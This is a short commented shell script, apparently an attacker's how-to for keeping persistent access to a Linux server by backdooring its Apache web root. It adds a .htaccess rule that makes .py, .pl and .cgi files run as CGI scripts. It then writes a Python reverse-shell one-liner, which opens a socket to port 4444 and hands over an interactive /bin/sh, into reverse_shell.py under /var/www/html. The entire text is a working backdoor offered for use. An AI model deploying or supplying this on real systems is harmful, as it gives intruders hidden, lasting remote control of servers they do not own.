# create presistence in the linux system by backdooring webserver


# create presistence using apache2 webserver .htaccess file

# create a file called .htaccess in /var/www/html

touch /var/www/html/.htaccess

# backdoor the created file to execute a reverse shell

echo "AddHandler cgi-script .cgi .pl .py" >> /var/www/html/.htaccess

# create a file called reverse_shell.py in /var/www/html

touch /var/www/html/reverse_shell.py

# add the following code to the reverse_shell.py file

echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('0.0.0.0', 4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);">> /var/www/html/reverse_shell.py

